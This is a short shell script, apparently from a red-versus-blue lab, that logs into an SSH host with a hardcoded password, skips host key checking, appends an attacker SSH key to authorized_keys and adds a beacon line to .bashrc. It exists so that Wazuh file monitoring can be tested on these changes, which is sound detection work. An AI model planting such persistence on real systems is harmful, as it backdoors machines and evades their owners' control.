#!/bin/sh
# 5a. Persistence on the SSH host after a successful login (as if the brute force
# worked): the unprivileged user leaves two footholds that survive a reboot:
#  - an attacker key in authorized_keys  (MITRE T1098.004)
#  - a beacon line in the shell profile  (MITRE T1546.004)
# Blue team's Wazuh FIM is meant to catch the file changes.
. "$(dirname "$0")/../lib.sh"
echo "5a. Persistance sur le serveur SSH (cle SSH + profil shell)"
on public sh -c '
sshpass -p azerty123 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 sysadmin@ssh "
    mkdir -p ~/.ssh && chmod 700 ~/.ssh
    echo \"ssh-ed25519 AAAAattackerkeyplaceholder attacker\" >> ~/.ssh/authorized_keys
    echo \"(id | logger -t beacon) 2>/dev/null\" >> ~/.bashrc
    echo persistance posee
"
'
